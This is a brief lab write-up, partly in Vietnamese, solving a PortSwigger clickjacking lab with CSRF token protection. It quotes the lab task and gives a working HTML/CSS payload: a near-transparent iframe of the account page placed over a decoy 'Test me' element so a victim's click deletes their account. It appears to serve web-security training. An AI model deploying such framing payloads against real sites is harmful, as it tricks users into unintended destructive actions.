# [Portswigger] Clickjacking

***

## 1. Lab: Basic clickjacking with CSRF token protection

* Content:
```
This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word "click" on a decoy website.

To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted.

You can log in to your own account using the following credentials: wiener:peter
```
* Exploit:

Dùng payload sau cho vào Exloit Server:
```
<style>
    iframe {
        position:relative;
        width: 700px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 500px;
        left: 60px;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="https://0a90004b0435b5e0b296118200d200a0.web-security-academy.net/my-account"></iframe>
```

Khi view Exploit ta sẽ thấy phần chữ "Click" ở đúng vi trí của "Delete Account"

<img width="355" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/4406580c-ec8f-4054-a46c-5489dba2189a">

LAB SOLVED!

<img width="594" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/532f04d4-86bb-49a1-aae0-af88ae23fa1f">
